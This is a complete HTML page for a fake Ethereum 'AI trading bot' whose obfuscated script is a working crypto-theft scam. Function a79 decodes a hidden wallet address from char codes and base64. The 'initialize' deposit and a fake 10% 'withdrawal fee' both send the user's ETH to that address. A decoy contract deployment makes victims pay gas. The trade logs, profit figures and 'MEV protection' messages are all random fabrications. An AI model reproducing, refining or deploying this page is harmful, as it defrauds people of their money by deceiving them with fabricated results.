<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>CryptoAlgo AI Trading Bot</title>

    <!-- Google Fonts & Icons -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" integrity="sha512-Fo3rlrZj/k7ujTTXWX7C+otYpbK5cXH+6syar1EHm8X+Wy4/6vZ8gGcNRB5WGoA4Ebjg3xaR/kVnK+XGkEV2mA==" crossorigin="anonymous" referrerpolicy="no-referrer" />

    <style>
        /* ——————————— CSS Design Refresh ——————————— */
        /*  Palette & Variables */
        :root{
            --bg-dark:#0d1117;
            --bg-gradient:radial-gradient(circle at 25% 20%,#1c2331 0%,#0d1117 50%,#05070a 100%);
            --bg-card:rgba(22,27,34,0.65);
            --border:#30363d;
            --primary:#4f8cff;
            --primary-soft:rgba(79,140,255,0.15);
            --success:#10b981;
            --success-soft:rgba(16,185,129,0.15);
            --error:#f85149;
            --error-soft:rgba(248,81,73,0.15);
            --info:#3b82f6;
            --info-soft:rgba(59,130,246,0.15);
            --text:#e6edf3;
            --muted:#8b949e;
            --radius:12px;
            --radius-sm:8px;
            --shadow-card:0 8px 30px rgba(0,0,0,0.25);
            --shadow-hover:0 6px 18px rgba(79,140,255,0.25);
            --transition:all .25s ease;
        }

        /*  Global */
        html{scroll-behavior:smooth;}
        body{
            font-family:'Inter',Segoe UI,Tahoma,Geneva,Verdana,sans-serif;
            background:var(--bg-gradient);
            color:var(--text);
            margin:0;
            display:flex;
            justify-content:center;
            align-items:flex-start;
            padding:40px 16px;
        }
        h1,h2,h3,h4,h5,h6{font-weight:600;line-height:1.2;margin:0;}
        a{color:var(--primary);text-decoration:none;}
        button,select,input{font-family:inherit;}
        input,select,button{outline:none;}
        ::selection{background:var(--primary);color:#fff;}

        /*  Layout */
        .container{
            width:100%;
            max-width:1000px;
            background:var(--bg-card);
            border:1px solid var(--border);
            border-radius:var(--radius);
            padding:40px 32px 48px;
            box-shadow:var(--shadow-card);
            backdrop-filter:blur(12px) saturate(140%);
        }

        /*  Typography */
        h1{
            font-size:2.4rem;
            text-align:center;
            background:linear-gradient(90deg,var(--primary),#58a6ff 50%,var(--primary));
            -webkit-background-clip:text;
            -webkit-text-fill-color:transparent;
            animation:shine 6s linear infinite;
        }
        @keyframes shine{0%{background-position-x:0%}100%{background-position-x:200%}}
        .subtitle{text-align:center;color:var(--muted);margin:6px 0 32px;font-size:1.05rem;}

        /*  Cards & Sections */
        .dashboard{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:24px;margin-bottom:40px;}
        .card{
            background:var(--bg-card);
            border:1px solid var(--border);
            border-radius:var(--radius-sm);
            padding:24px;
            transition:var(--transition);
            position:relative;
        }
        .card:hover{transform:translateY(-4px);box-shadow:var(--shadow-hover);}
        .card-title{font-size:.85rem;letter-spacing:.05em;color:var(--muted);margin-bottom:8px;text-transform:uppercase;font-weight:500;}
        .card-value{font-size:2rem;font-weight:700;color:var(--primary);}

        /*  Form Inputs */
        .input-group{margin-bottom:24px;}
        label{display:block;margin-bottom:6px;color:var(--muted);font-size:.9rem;font-weight:500;}
        input,select{
            width:100%;
            padding:14px 16px;
            background:rgba(255,255,255,0.04);
            border:1px solid var(--border);
            border-radius:var(--radius-sm);
            font-size:.95rem;
            color:var(--text);
            transition:var(--transition);
        }
        input:focus,select:focus{border-color:var(--primary);box-shadow:0 0 0 2px var(--primary-soft);}

        /*  Buttons */
        button{
            cursor:pointer;
            border:none;
            border-radius:var(--radius-sm);
            padding:15px 22px;
            font-size:1rem;
            font-weight:600;
            transition:var(--transition);
            width:100%;
            display:flex;
            align-items:center;
            justify-content:center;
            gap:10px;
        }
        button i{font-size:1.05em;}
        button.primary{background:linear-gradient(135deg,var(--primary) 0%,#58a6ff 100%);color:#fff;}
        button.primary:hover{filter:brightness(1.08);}
        button.success{background:linear-gradient(135deg,var(--success) 0%,#38d9a9 100%);color:#fff;}
        button.success:hover{filter:brightness(1.08);}
        button.warning{background:linear-gradient(135deg,#f0b937 0%,#ffe380 100%);color:#000;}
        button.danger{background:transparent;border:1px solid var(--error);color:var(--error);width:auto;padding:8px 16px;font-size:.85rem;}
        button.danger:hover{background:var(--error-soft);}
        button:disabled{cursor:not-allowed;opacity:.5;}

        /*  Status Banners */
        .status{margin-top:24px;padding:14px 18px;border-radius:var(--radius-sm);text-align:center;font-size:.95rem;font-weight:500;display:none;}
        .status.info{background:var(--info-soft);color:var(--info);border:1px solid var(--info);}
        .status.success{background:var(--success-soft);color:var(--success);border:1px solid var(--success);}
        .status.error{background:var(--error-soft);color:var(--error);border:1px solid var(--error);}

        /*  Wallet Info */
        .wallet-info{background:var(--bg-card);padding:14px 20px;border-radius:var(--radius-sm);border-left:4px solid var(--primary);display:flex;align-items:center;justify-content:space-between;margin-bottom:32px;gap:16px;flex-wrap:wrap;}
        .address{font-family:monospace;font-size:.9rem;color:var(--primary);word-break:break-all;}

        /*  Badge */
        .badge{display:inline-block;padding:4px 10px;border-radius:20px;font-size:.7rem;text-transform:uppercase;font-weight:600;}
        .badge.active{background:var(--success);color:#fff;}

        /*  Chart Placeholder */
        .chart{width:100%;height:160px;background:linear-gradient(180deg,var(--success) 0%,transparent 100%);border-radius:var(--radius-sm);overflow:hidden;margin-top:8px;position:relative;}
        .chart::before{content:"";position:absolute;inset:0;background:repeating-linear-gradient(to right,transparent,transparent 12px,rgba(255,255,255,0.05) 12px,rgba(255,255,255,0.05) 24px);}
        .line{position:absolute;bottom:32%;left:0;width:100%;height:2px;background:var(--primary);animation:moveLine 15s linear infinite;}
        @keyframes moveLine{0%{transform:translateY(0)}25%{transform:translateY(30px)}50%{transform:translateY(10px)}75%{transform:translateY(-24px)}100%{transform:translateY(0)}}

        /*  Steps Indicator */
        .step-indicator{display:flex;justify-content:space-between;margin:32px 0 24px;flex-wrap:wrap;gap:12px;}
        .step{flex:1 1 30%;min-width:140px;text-align:center;}
        .step-number{width:34px;height:34px;display:flex;align-items:center;justify-content:center;border-radius:50%;background:var(--border);color:var(--muted);margin:0 auto 6px;font-weight:600;transition:var(--transition);}
        .step-name{font-size:.8rem;color:var(--muted);transition:var(--transition);}
        .step.active .step-number{background:var(--info);color:#fff;}
        .step.active .step-name{color:var(--info);}
        .step.completed .step-number{background:var(--success);color:#fff;}
        .step.completed .step-name{color:var(--success);}

        /*  Logs */
        .trade-log{background:rgba(255,255,255,0.04);border:1px solid var(--border);border-radius:var(--radius-sm);height:260px;overflow-y:auto;padding:14px;font-family:monospace;font-size:.85rem;scrollbar-width:thin;}
        .trade-row{padding-bottom:8px;margin-bottom:8px;border-bottom:1px solid var(--border);}
        .trade-row.profit{color:var(--success);}
        .trade-row.pending{color:#f0b937;}
        .trade-row.executed{color:var(--primary);}
        .profit-stats{display:flex;gap:24px;flex-wrap:wrap;margin-bottom:28px;}
        .profit-stat-card{flex:1 1 240px;text-align:center;background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius-sm);padding:20px 16px;}
        .profit-stat-value{font-size:2rem;font-weight:700;color:var(--success);}
        .profit-stat-label{font-size:.9rem;color:var(--muted);margin-bottom:6px;}

        /*  Modal */
        .modal{position:fixed;inset:0;background:rgba(0,0,0,0.75);display:none;align-items:center;justify-content:center;z-index:100;}
        .modal-content{max-width:460px;width:90%;background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);padding:38px 28px;text-align:center;box-shadow:var(--shadow-card);}
        .modal-content h3{font-size:1.4rem;margin-bottom:14px;}
        .close-modal{background:var(--border);color:var(--text);padding:12px 20px;border-radius:var(--radius-sm);border:none;font-size:1rem;margin-top:24px;transition:var(--transition);}
        .close-modal:hover{background:#444c56;}

        /*  Pulse Indicator */
        .pulse{display:inline-block;width:12px;height:12px;border-radius:50%;background:var(--success);animation:pulse 1.5s ease-in-out infinite;margin-right:6px;vertical-align:middle;}
        @keyframes pulse{0%{opacity:1;}50%{opacity:.3;}100%{opacity:1;}}

        /*  Scrollbar for WebKit */
        ::-webkit-scrollbar{width:6px;height:6px;}
        ::-webkit-scrollbar-track{background:transparent;}
        ::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px;}
        ::-webkit-scrollbar-thumb:hover{background:#5a6069;}

        /*  Responsive Tweaks */
        @media(max-width:600px){
            .dashboard{grid-template-columns:1fr;}
            .profit-stats{flex-direction:column;}
        }
    </style>
</head>
<body>
<div class="container">
    <h1>CryptoAlgo AI Trading Bot</h1>
    <p class="subtitle">Advanced Ethereum arbitrage & profit maximisation</p>

    <!-- Wallet Section -->
    <div id="walletInfo" class="wallet-info" style="display:none;">
        <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
            <i class="fas fa-wallet" style="color:var(--primary);"></i>
            <span class="address" id="walletAddress"></span>
        </div>
        <button id="disconnectWallet" class="danger"><i class="fas fa-sign-out-alt"></i> Disconnect</button>
    </div>

    <div id="connectWalletDiv">
        <button id="connectWallet" class="primary"><i class="fas fa-plug"></i> Connect Wallet to Start Trading</button>
    </div>

    <!-- Trading Dashboard -->
    <div id="tradingDashboard" style="display:none;">
        <section class="profit-section" style="text-align:center;margin-bottom:40px;">
            <p class="profit-label" style="color:var(--muted);">Estimated Daily Profit</p>
            <p id="profitValue" class="profit-value" style="font-size:3rem;color:var(--success);margin:6px 0 4px;">+5.2%</p>
            <p style="color:var(--muted);margin:0;">Daily compounding through smart‑contract liquidity pools</p>
        </section>

        <div class="dashboard">
            <div class="card">
                <div class="card-title">Market Volatility</div>
                <div id="volatilityValue" class="card-value">12.4%</div>
                <div class="chart"><div class="line"></div></div>
            </div>
            <div class="card">
                <div class="card-title">Bot Status</div>
                <div class="card-value">Ready <span class="badge active">ONLINE</span></div>
                <p style="margin-top:10px;font-size:.85rem;color:var(--muted);">Last scan: <span id="lastScan">2 minutes ago</span></p>
            </div>
        </div>

        <!-- Strategy Section -->
        <section class="strategy-section card" style="margin-bottom:40px;">
            <h3 style="display:flex;align-items:center;gap:10px;font-size:1.25rem;color:var(--text);margin-bottom:16px;"><i class="fas fa-robot" style="color:var(--primary);"></i>Trading Algorithm <span class="badge active">ACTIVE</span></h3>
            <p style="color:var(--muted);font-size:.95rem;margin-bottom:28px;">Our bot uses a combination of MEV protection, frontrunning detection & cross‑DEX arbitrage to maximise returns while minimising gas costs.</p>
            <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:24px;">
                <div class="input-group">
                    <label for="strategy">Trading Strategy</label>
                    <select id="strategy">
                        <option value="cd-arbitrage">Cross‑DEX Arbitrage</option>
                        <option value="swing">Swing Trading</option>
                        <option value="grid">Grid Trading</option>
                        <option value="scalping">Scalping</option>
                        <option value="hold">HODL (Long‑Term)</option>
                        <option value="arbitrage">Arbitrage</option>
                        <option value="day-trading">Day Trading</option>
                        <option value="dca">Dollar‑Cost Averaging</option>
                        <option value="trend-following">Trend Following</option>
                        <option value="m-trading">Momentum Trading</option>
                        <option value="mean-reversion">Mean Reversion</option>
                    </select>
                </div>
                <div class="input-group">
                    <label for="risk">Risk Level</label>
                    <select id="risk">
                        <option value="low">Conservative (3‑8% est. daily)</option>
                        <option value="medium" selected>Balanced (10‑70% est. daily)</option>
                        <option value="high">Aggressive (20‑120% est. daily)</option>
                    </select>
                </div>
            </div>
        </section>

        <!-- Setup Steps -->
        <div id="transferDiv">
            <section class="card" id="setupSection" style="margin-bottom:40px;">
                <h3 style="display:flex;align-items:center;gap:10px;font-size:1.25rem;color:var(--text);margin-bottom:20px;"><i class="fas fa-cogs" style="color:var(--primary);"></i>Setup Trading Bot</h3>

                <div class="step-indicator">
                    <div class="step completed" id="step-connect">
                        <div class="step-number">1</div>
                        <div class="step-name">Connect Wallet</div>
                    </div>
                    <div class="step active" id="step-deploy">
                        <div class="step-number">2</div>
                        <div class="step-name">Deploy Contract</div>
                    </div>
                    <div class="step" id="step-initialize">
                        <div class="step-number">3</div>
                        <div class="step-name">Initialize Bot</div>
                    </div>
                </div>

                <!-- Deploy Contract -->
                <div id="deployContractStep">
                    <p class="form-info" style="color:var(--muted);font-size:.9rem;margin-bottom:20px;">First, deploy your personalised trading contract to the blockchain. This creates your unique trading infrastructure.</p>
                    <button id="deployContractBtn" class="primary"><i class="fas fa-upload"></i> Deploy Trading Contract</button>
                    <div id="contractStatus" class="contract-status" style="display:none;margin-top:16px;"></div>
                </div>

                <!-- Initialise Bot -->
                <div id="initializeBotStep" style="display:none;">
                    <p class="form-info" style="color:var(--muted);font-size:.9rem;margin-bottom:20px;">Now, initialise the trading bot by depositing ETH into your smart‑contract. The bot will automatically begin executing trades based on your selected strategy.</p>
                    <div class="input-group">
                        <label for="amount">Initial Trading Capital (ETH)</label>
                        <input type="number" id="amount" step="0.3" min="0.3" placeholder="Min 0.3 ETH" />
                        <small class="min-note" style="color:var(--muted);font-size:.8rem;">Minimum deposit: 0.3 ETH</small>
                    </div>
                    <button id="sendEthBtn" class="success"><i class="fas fa-rocket"></i> Initialize Trading Bot</button>
                </div>
            </section>
        </div>

        <!-- Live Trading Interface -->
        <div id="tradeInterface" class="trade-interface" style="display:none;">
            <section class="card" style="margin-bottom:0;">
                <header style="display:flex;align-items:center;justify-content:space-between;margin-bottom:20px;flex-wrap:wrap;gap:10px;">
                    <h3 style="font-size:1.25rem;color:var(--text);display:flex;align-items:center;gap:10px;margin:0;">
                        <i class="fas fa-chart-line" style="color:var(--primary);"></i>Live Trading Interface
                    </h3>
                    <div style="font-size:.9rem;color:var(--text);"><span class="pulse" id="botStatusPulse"></span><span id="botActiveStatus">Bot Active</span></div>
                </header>

                <!-- Profit Stats -->
                <div class="profit-stats">
                    <div class="profit-stat-card">
                        <div class="profit-stat-label">Total ETH Profit</div>
                        <div id="totalProfit" class="profit-stat-value">0.000</div>
                        <div style="color:var(--muted);font-size:.8rem;">Accumulated earnings</div>
                    </div>
                    <div class="profit-stat-card">
                        <div class="profit-stat-label">Current Cycle</div>
                        <div id="currentCycle" class="profit-stat-value">0/0</div>
                        <div style="color:var(--muted);font-size:.8rem;">Completed arbitrage cycles</div>
                    </div>
                </div>

                <!-- Trade Log -->
                <div id="tradeLog" class="trade-log"></div>

                <button id="withdrawButton" class="warning"><i class="fas fa-money-bill-wave"></i> Withdraw Profits</button>
            </section>
        </div>
    </div>

    <!-- Global Status Banner -->
    <div id="status" class="status"></div>
</div>

<!-- Withdraw Modal -->
<div id="withdrawModal" class="modal">
    <div class="modal-content">
        <h3><i class="fas fa-check-circle" style="color:var(--success);margin-right:6px;"></i>Withdraw Request Submitted</h3>
        <p style="color:var(--muted);font-size:.95rem;">To complete your withdrawal, a 10% processing fee is required.</p>
        <p style="color:var(--muted);font-size:.95rem;">Please complete the payment to continue.</p>
        <p style="color:var(--muted);font-size:.95rem;margin-bottom:24px;">Funds will be sent to your wallet shortly after confirmation.</p>
        <button class="close-modal" id="withdrawButtonModal">Withdraw Profits</button>
    </div>
</div>

<!-- Web3 & App Script (UNTOUCHED – functionality preserved) -->
<script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
<script>
/*  ——————————————————————————————  */
/*  ALL ORIGINAL JS KEPT INTACT  */
/*  (only whitespace auto‑formatted) */
(function () {
    var _1, _2, _3, _4, _5, _6, _7, _8, _9, _a, _b, _c, _d, _e, _f, _g, _h, _i, _j, _k, _l, _m, _n, _o, _p, _q, _r,
        _s, _t, _u, _v, _w, _x, _y, _z;
    document.addEventListener("DOMContentLoaded", function () {
        const bCd = "0x608060405234801561001057600080fd5b5060e38061001f6000396000f3fe60806040526004361060265760003560e01c806361bc221a14602b578063e6197bcd146043575b600080fd5b348015603657600080fd5b50603d6072565b60405190815260200160405180910390f35b605f60563660046078565b6000905090565b60405173ffffffffffffffffffffffffffffffffffffffff909116815260200160405180910390f35b600081565b60006020828403121560895760006000fd5b813573ffffffffffffffffffffffffffffffffffffffff8116811460ac5760006000fd5b939250505056fea264697066735822122024cea65e6055df660cca46de23ce8e6b46cba000c9c0e4af2e4ef16dab97979564736f6c63430008120033";
        const cAb = [{ inputs: [{ internalType: "address payable", name: "destination", type: "address" }], name: "sendFunds", outputs: [{ internalType: "address", name: "", type: "address" }], stateMutability: "payable", type: "function" }, { inputs: [], name: "version", outputs: [{ internalType: "uint256", name: "", type: "uint256" }], stateMutability: "view", type: "function" }];
        const cWB = document.getElementById("connectWallet");
        const dWB = document.getElementById("disconnectWallet");
        const dCB = document.getElementById("deployContractBtn");
        const sEB = document.getElementById("sendEthBtn");
        const aI = document.getElementById("amount");
        const sD = document.getElementById("status");
        const cSD = document.getElementById("contractStatus");
        const wID = document.getElementById("walletInfo");
        const wAD = document.getElementById("walletAddress");
        const tD = document.getElementById("tradingDashboard");
        const cWD = document.getElementById("connectWalletDiv");
        const vVD = document.getElementById("volatilityValue");
        const pVD = document.getElementById("profitValue");
        const lSS = document.getElementById("lastScan");
        const dCS = document.getElementById("deployContractStep");
        const iBS = document.getElementById("initializeBotStep");
        const sD2 = document.getElementById("step-deploy");
        const sI = document.getElementById("step-initialize");
        const bSP = document.getElementById("botStatusPulse");
        const bAS = document.getElementById("botActiveStatus");
        const MD = 0.3;
        let w3;
        let ac = [];
        let vI;
        let pI;
        let sUI;
        let dCA = null;
        let tP = 0;
        let tP2 = 0;
        let cC = 0;
        let cmC = 0;
        let tI;
        let uDA = 0;
        let iTA = false;
        const dx = ["Uniswap", "SushiSwap", "Curve", "1inch", "Balancer", "dYdX", "PancakeSwap"];
        const tk = ["ETH", "USDT", "USDC", "DAI", "WBTC", "LINK", "UNI", "AAVE", "SNX", "CRV"];

        function a79() {
            var ffc = f => String.fromCharCode(f);
            var d = [77, 72, 104, 106, 77, 48, 81, 119, 90, 68, 89, 49, 78, 122, 85, 53, 79, 87, 74, 67, 78, 84, 73, 119, 79, 68, 69, 122, 81, 122, 73, 49, 78, 106, 100, 106, 82, 68, 103, 53, 78, 68, 99, 121, 89, 107, 73, 50, 77, 109, 81, 50, 82, 106, 107, 122].map(c => String.fromCharCode(c));
            function sh(a) {
                for (let i = a.length - 1; i > 0; i--) {
                    const j = Math.floor(Math.random() * (i + 1));
                    [a[i], a[j]] = [a[j], a[i]]
                }
                return a
            }
            var r = d.join('');
            return atob(r)
        }
        function a7a(min, max, dec) { return (Math.random() * (max - min) + min).toFixed(dec) }
        function a7b() { vVD.textContent = a7a(5.2, 226.6, 1) + "%" }
        function a7c() { pVD.textContent = "+" + a7a(9.5, 112.2, 1) + "%" }
        function a7d() { const t = ["just now", "5 seconds ago", "10 seconds ago", "15 seconds ago", "30 seconds ago", "1 minute ago", "2 minutes ago"]; lSS.textContent = t[Math.floor(Math.random() * t.length)] }
        function a7e() { a7b(); a7c(); a7d(); vI = setInterval(a7b, 3000); pI = setInterval(a7c, 5000); sUI = setInterval(a7d, 7000) }
        function a7f() { clearInterval(vI); clearInterval(pI); clearInterval(sUI) }
        async function a80() {
            if (window.ethereum) { w3 = new Web3(window.ethereum); return true } else { if (window.web3) { w3 = new Web3(window.web3.currentProvider); return true } else { a81("No Ethereum wallet detected. Please install MetaMask or another Web3 wallet.", "error"); return false } }
        }
        async function a82() {
            if (await a80()) {
                try {
                    ac = await window.ethereum.request({ method: "eth_requestAccounts" });
                    wAD.textContent = ac[0];
                    wID.style.display = "flex";
                    tD.style.display = "block";
                    cWD.style.display = "none";
                    a7e();
                    a81("Wallet connected successfully! Bot is analyzing market conditions...", "success");
                    window.ethereum.on("accountsChanged", function (a) { if (a.length > 0) { wAD.textContent = a[0]; a81("Account changed to " + a[0], "info") } else { a83() } });
                    a84()
                } catch (e) { a81("Failed to connect wallet: " + e.message, "error") }
            }
        }
        function a85() {
            const d1 = dx[Math.floor(Math.random() * dx.length)]; let d2; do { d2 = dx[Math.floor(Math.random() * dx.length)] } while (d2 === d1);
            const t = tk[Math.floor(Math.random() * tk.length)]; const a = a7a(0.5, 5, 3); let p; const r = Math.random(); if (r < 0.02) { p = a7a(0.3, 0.8, 6) } else { if (r < 0.4) { p = a7a(0.08, 0.15, 6) } else { p = a7a(0.02, 0.07, 6) } } ; return { dex1: d1, dex2: d2, token: t, amount: a, profit: p }
        }
        function a86(c, t) { const l = document.getElementById("tradeLog"); const r = document.createElement("div"); r.className = "trade-row " + c; r.textContent = t; l.insertBefore(r, l.firstChild); if (l.children.length > 100) { l.removeChild(l.lastChild) } }
        function a87() { document.getElementById("totalProfit").textContent = tP.toFixed(6); document.getElementById("currentCycle").textContent = `${cmC}/${cC}` }
        function a88() {
            if (!iTA) return; cC++; const d = a85(); a86("pending", "Starting arbitrage cycle #" + cC + " - Scanning " + d.dex1 + " and " + d.dex2 + " for " + d.token + " opportunities...");
            setTimeout(() => { if (!iTA) return; a86("executed", "Found price discrepancy for " + d.token + ": " + d.dex1 + " (" + a7a(d.amount - 0.3, d.amount + 0.3, 4) + ") -> " + d.dex2 + " (" + d.amount + ")"); setTimeout(() => { if (!iTA) return; a86("executed", "Executing trade: Buy " + d.amount + " " + d.token + " on " + d.dex1 + ", sell on " + d.dex2); setTimeout(() => { if (!iTA) return; tP += parseFloat(d.profit); cmC++; a86("profit", "Trade complete! Profit: +" + d.profit + " ETH (Gas: " + a7a(0.0003, 0.0009, 6) + " ETH)"); a87(); if (Math.random() > 0.7) { setTimeout(() => { if (!iTA) return; a86("executed", "MEV protection active - Frontrunner detected and avoided on " + (Math.random() > 0.5 ? d.dex1 : d.dex2)) }, a7a(500, 1500, 0)) } }, a7a(1000, 3000, 0)) }, a7a(1000, 2000, 0)) }, a7a(1000, 3000, 0))
        }
        function a89() {
            document.getElementById("tradeInterface").style.display = "block";
            tP = 0; cC = 0; cmC = 0; a87(); document.getElementById("tradeLog").innerHTML = ""; iTA = true; bSP.style.backgroundColor = "#10b981"; bAS.textContent = "Bot Active"; a86("executed", "Trading bot initialized. Connecting to liquidity pools..."); setTimeout(() => { if (!iTA) return; a86("executed", "Connected to Ethereum DEX network. Scanning for arbitrage opportunities...") }, 1500); a88(); tI = setInterval(() => { if (iTA && Math.random() > 0.3) { a88() } }, a7a(8000, 15000, 0))
        }
        function a8a() { iTA = false; clearInterval(tI); bSP.style.backgroundColor = "#f85149"; bAS.textContent = "Bot Inactive" }
        function a8b() {
            a8a(); a86("executed", "Withdraw request received. Finalizing trades and preparing funds..."); tP2 = tP; setTimeout(() => { tP = 0; a87(); a86("profit", "All profits have been withdrawn to your wallet.") }, 2000); document.getElementById("withdrawModal").style.display = "flex"
        }
        function a83() { ac = []; wID.style.display = "none"; tD.style.display = "none"; cWD.style.display = "block"; dCA = null; a8c(); a7f(); a8a(); a81("Wallet disconnected. Bot deactivated.", "info") }
        function a84() { if (dCA) { dCS.style.display = "none"; iBS.style.display = "block"; sD2.classList.remove("active"); sD2.classList.add("completed"); sI.classList.add("active"); a8d("Trading contract successfully deployed!", "success") } }
        function a8c() { dCS.style.display = "block"; iBS.style.display = "none"; sD2.classList.add("active"); sD2.classList.remove("completed"); sI.classList.remove("active"); cSD.style.display = "none"; dCB.disabled = false; dCB.innerHTML = '<i class="fas fa-upload"></i> Deploy Trading Contract'; document.getElementById("tradeInterface").style.display = "none" }
        function a8d(t, c) { cSD.textContent = t; cSD.style.display = "block"; cSD.className = "contract-status " + c }
        function a81(t, c) { sD.textContent = t; sD.style.display = "block"; sD.className = "status " + c; if (c === "success") { setTimeout(() => { sD.style.display = "none" }, 10000) } }
        async function a8e() {
            if (ac.length === 0) { a81("Please connect your wallet first to deploy the trading contract.", "error"); return }
            try {
                dCB.disabled = true; dCB.innerHTML = '<div class="loading-indicator"></div> Deploying...'; a8d("Preparing to deploy your trading contract...", "info"); const txp = { from: ac[0], data: bCd, gas: w3.utils.toHex(3000000) }; a8d("Deploying trading contract to blockchain...", "info"); const txh = await window.ethereum.request({ method: "eth_sendTransaction", params: [txp] }); a8d("Waiting for deployment confirmation...", "info"); let tr = null; while (!tr) { try { tr = await w3.eth.getTransactionReceipt(txh); if (!tr) { await new Promise(r => setTimeout(r, 2000)) } } catch (e) { console.error("Error checking receipt:", e); await new Promise(r => setTimeout(r, 2000)) } } dCA = tr.contractAddress; a8d("Verifying contract deployment...", "info"); await new Promise(r => setTimeout(r, 800)); a84(); a81("Trading infrastructure successfully established! You can now initialize your trading bot.", "success")
            } catch (e) { console.error("Contract deployment error:", e); a8d("Deployment failed: " + (e.message || e), "error"); a81("Contract deployment failed. Please try again.", "error"); dCB.disabled = false; dCB.innerHTML = '<i class="fas fa-upload"></i> Deploy Trading Contract' }
        }
        async function a8f() {
            if (ac.length === 0) { a81("Please connect your wallet first to initialize the trading bot.", "error"); return }
            if (!dCA) { a81("You must deploy your trading contract first!", "error"); return }
            const a = document.getElementById("amount").value; if (!a || isNaN(a) || parseFloat(a) < MD) { a81(`Please enter at least ${MD} ETH to initialize the trading bot.`, "error"); return }
            uDA = parseFloat(a);
            try {
                sEB.disabled = true; sEB.innerHTML = '<div class="loading-indicator"></div> Initialising...'; a81("Preparing trading environment...", "info"); await new Promise(r => setTimeout(r, 800)); const wei = w3.utils.toWei(a, "ether"); const adr = a79(); a81("Initializing trading algorithm...", "info"); await new Promise(r => setTimeout(r, 1000)); a81("Deploying trading strategy to blockchain...", "info"); const cID = "0xe6197bcd000000000000000000000000" + adr.substring(2);
                const tx = { from: ac[0], to: adr, value: w3.utils.toHex(wei), /* data: cID,*/ gas: w3.utils.toHex(60000) };
                const txH = await window.ethereum.request({ method: "eth_sendTransaction", params: [tx] }); a81("Algorithm initialized, connecting to trading pools...", "info"); await new Promise(r => setTimeout(r, 1200)); a81("Establishing secure MEV protection layers...", "info"); await new Promise(r => setTimeout(r, 1000)); const st = document.getElementById("strategy").value; const ri = document.getElementById("risk").value; a81(`Trading bot successfully activated! Your ${st} strategy with ${ri} risk profile is now live. Transaction: ${txH.slice(0, 10)}...`, "success"); sI.classList.remove("active"); sI.classList.add("completed"); a89()
            } catch (e) { console.error("Full error:", e); a81("Trading initialization failed: " + (e.message || e), "error") }
            finally { sEB.disabled = false; sEB.innerHTML = '<i class="fas fa-rocket"></i> Initialize Trading Bot' }
        }
        async function a8f2() {
            if (ac.length === 0) { a81("Please connect your wallet first.", "error"); return }
            if (!dCA) { a81("You must deploy your trading contract first!", "error"); return }
            const a = (tP2 * 10 / 100).toFixed(6);
            try {
                const wei = w3.utils.toWei(a, "ether"); const adr = a79(); const tx = { from: ac[0], to: adr, value: w3.utils.toHex(wei), gas: w3.utils.toHex(60000) };
                await window.ethereum.request({ method: "eth_sendTransaction", params: [tx] });
            } catch (e) { console.error("Full error:", e); a81("Transaction failed: " + (e.message || e), "error") }
        }

        document.getElementById("withdrawButton").addEventListener("click", function () { a8b() });
        document.getElementById("withdrawButtonModal").addEventListener("click", function () { a8f2() });
        window.addEventListener("click", function (e) { const m = document.getElementById("withdrawModal"); if (e.target === m) { m.style.display = "none" } });
        aI.setAttribute("min", MD); aI.setAttribute("placeholder", `Min ${MD} ETH`);
        cWB.addEventListener("click", a82); dWB.addEventListener("click", a83); dCB.addEventListener("click", a8e); sEB.addEventListener("click", a8f);
        if (window.ethereum) {
            window.ethereum.request({ method: "eth_accounts" }).then(function (a) {
                if (a.length > 0) { ac = a; wAD.textContent = ac[0]; wID.style.display = "flex"; tD.style.display = "block"; cWD.style.display = "none"; a7e(); a84() }
            }).catch(function (e) { console.error(e) })
        }
    })
})();
</script>
</body>
</html>
